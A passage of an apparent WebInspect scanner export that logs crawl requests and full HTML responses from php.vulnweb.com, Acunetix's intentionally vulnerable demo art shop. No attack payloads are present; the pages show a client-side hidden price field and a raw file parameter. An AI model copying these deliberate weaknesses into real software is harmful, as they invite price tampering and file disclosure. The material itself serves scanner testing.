]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:16 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C0F9BCECD38C144E506D47D5190B6065"><URL>http://php.vulnweb.com:80/product.php?pic=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C0F9BCECD38C144E506D47D5190B6065"><![CDATA[GET /product.php?pic=3 HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="C0F9BCECD38C144E506D47D5190B6065";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ea296470";
X-Request-Memo: ID="b0b49ca0";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:52 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6401

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>The universe</h2><div class='story'><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $986</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='986'><input type='hidden' name='addcart' value='3'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="C0F9BCECD38C144E506D47D5190B6065"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pic=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pic</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="C0F9BCECD38C144E506D47D5190B6065";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ea296470";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b0b49ca0";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>The universe</h2><div class='story'><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $986</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='986'><input type='hidden' name='addcart' value='3'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:52 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6401</Value></Header></Headers><SetCookies /><Forms><Form><Action>cart.php</Action><Method>POST</Method><Name>f_addcart</Name><OnSubmit /><InputFields><InputField><Name>price</Name><Value>986</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>addcart</Name><Value>3</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name /><Value>add this picture to cart</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="4D851B7FB1D245602E09CD660B9694F0"><URL>http://php.vulnweb.com:80/product.php?pic=4</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="4D851B7FB1D245602E09CD660B9694F0"><![CDATA[GET /product.php?pic=4 HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="4D851B7FB1D245602E09CD660B9694F0";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2d5e3888";
X-Request-Memo: ID="8d3093aa";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:53 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6453

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Walking</h2><div class='story'><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $1000</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='1000'><input type='hidden' name='addcart' value='4'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4D851B7FB1D245602E09CD660B9694F0"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pic=4</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pic</Name><Value>4</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="4D851B7FB1D245602E09CD660B9694F0";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2d5e3888";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8d3093aa";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Walking</h2><div class='story'><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $1000</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='1000'><input type='hidden' name='addcart' value='4'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
